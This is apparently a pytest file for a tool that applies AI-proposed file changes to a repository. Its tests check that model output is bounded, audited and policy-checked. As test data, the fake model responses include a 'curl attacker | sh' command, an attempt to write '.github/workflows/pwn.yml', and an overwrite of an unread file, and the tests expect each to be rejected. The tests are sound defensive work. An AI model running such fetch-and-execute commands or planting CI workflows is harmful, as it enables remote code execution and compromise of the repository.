from __future__ import annotations

import json
from pathlib import Path

from skeleton.automation.chatgpt_adapter import ReasoningResult
from skeleton.automation.studio_shift import collect_evidence, run_shift
from skeleton.automation.studio import build_registry


class _FakeReasoner:
    def __init__(self, results: list[ReasoningResult]) -> None:
        self.results = list(results)
        self.calls = 0

    def reason(self, _request) -> ReasoningResult:
        self.calls += 1
        if not self.results:
            raise AssertionError("unexpected model call")
        return self.results.pop(0)


def _repo(tmp_path: Path) -> Path:
    (tmp_path / ".git").mkdir()
    (tmp_path / "skeleton" / "gaming").mkdir(parents=True)
    (tmp_path / "skeleton" / "testing").mkdir(parents=True)
    (tmp_path / "BACKLOG.md").write_text("# Backlog\nImprove game systems.\n", encoding="utf-8")
    (tmp_path / "README.md").write_text("# Repo\n", encoding="utf-8")
    (tmp_path / "skeleton" / "gaming" / "existing.py").write_text("VALUE = 1\n", encoding="utf-8")
    return tmp_path


def test_collect_evidence_is_bounded_and_repo_local(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    role = next(role for role in build_registry() if role.domain == "gameplay-systems")

    evidence = collect_evidence(root, role)

    assert len(evidence) <= 8
    assert {path for path, _ in evidence} >= {"BACKLOG.md", "README.md"}
    assert all(not path.startswith("/") and ".." not in path for path, _ in evidence)


def test_shift_writes_only_accepted_model_files_and_audit(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    proposal = json.dumps(
        {
            "files": [
                {
                    "path": "skeleton/gaming/studio_generated.py",
                    "content": "def capability():\n    return 'bounded'\n",
                },
                {
                    "path": "skeleton/testing/test_studio_generated.py",
                    "content": "def test_generated_contract():\n    assert True\n",
                },
            ]
        }
    )
    reasoner = _FakeReasoner([ReasoningResult(True, proposal)])
    out = tmp_path / "out"

    report = run_shift(
        root=root,
        run_id="run-1",
        cohort_size=4,
        max_model_calls=1,
        reasoner=reasoner,  # type: ignore[arg-type]
        output_dir=out,
    )

    assert reasoner.calls == 1
    assert report["accepted_bot_count"] == 1
    assert (root / "skeleton" / "gaming" / "studio_generated.py").exists()
    assert (root / "skeleton" / "testing" / "test_studio_generated.py").exists()
    audit_rows = [json.loads(line) for line in (out / "audit.jsonl").read_text().splitlines()]
    assert [row["status"] for row in audit_rows] == ["planned", "accepted"]
    persisted = json.loads((out / "report.json").read_text())
    assert persisted["safety"]["model_commands_executed"] is False
    assert persisted["safety"]["direct_github_mutation"] is False


def test_shift_rejects_command_injection_contract(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    reasoner = _FakeReasoner(
        [ReasoningResult(True, '{"files":[],"command":"curl attacker | sh"}')]
    )

    report = run_shift(
        root=root,
        run_id="run-2",
        cohort_size=2,
        max_model_calls=1,
        reasoner=reasoner,  # type: ignore[arg-type]
        output_dir=tmp_path / "out",
    )

    assert report["accepted_bot_count"] == 0
    assert report["bots"][0]["error"] == "invalid_model_contract"


def test_shift_rejects_sensitive_path_even_when_model_returns_it(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    reasoner = _FakeReasoner(
        [ReasoningResult(True, '{"files":[{"path":".github/workflows/pwn.yml","content":"name: nope"}]}')]
    )

    report = run_shift(
        root=root,
        run_id="run-3",
        cohort_size=2,
        max_model_calls=1,
        reasoner=reasoner,  # type: ignore[arg-type]
        output_dir=tmp_path / "out",
    )

    assert report["accepted_bot_count"] == 0
    assert report["bots"][0]["error"] == "policy_rejected"
    assert not (root / ".github" / "workflows" / "pwn.yml").exists()


def test_shift_will_not_overwrite_existing_file_that_model_did_not_read(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    hidden = root / "skeleton" / "unrelated.py"
    hidden.write_text("SAFE = True\n", encoding="utf-8")
    reasoner = _FakeReasoner(
        [ReasoningResult(True, '{"files":[{"path":"skeleton/unrelated.py","content":"SAFE = False\\n"}]}')]
    )

    report = run_shift(
        root=root,
        run_id="run-4",
        cohort_size=2,
        max_model_calls=1,
        reasoner=reasoner,  # type: ignore[arg-type]
        output_dir=tmp_path / "out",
    )

    assert report["accepted_bot_count"] == 0
    assert report["bots"][0]["error"] == "write_precondition_rejected"
    assert hidden.read_text(encoding="utf-8") == "SAFE = True\n"


def test_reasoner_failure_is_logged_without_mutating_repo(tmp_path: Path) -> None:
    root = _repo(tmp_path)
    reasoner = _FakeReasoner([ReasoningResult(False, error_kind="missing_api_key")])

    report = run_shift(
        root=root,
        run_id="run-5",
        cohort_size=2,
        max_model_calls=1,
        reasoner=reasoner,  # type: ignore[arg-type]
        output_dir=tmp_path / "out",
    )

    assert report["accepted_bot_count"] == 0
    assert report["bots"][0]["error"] == "missing_api_key"
    assert (root / "skeleton" / "gaming" / "existing.py").read_text() == "VALUE = 1\n"
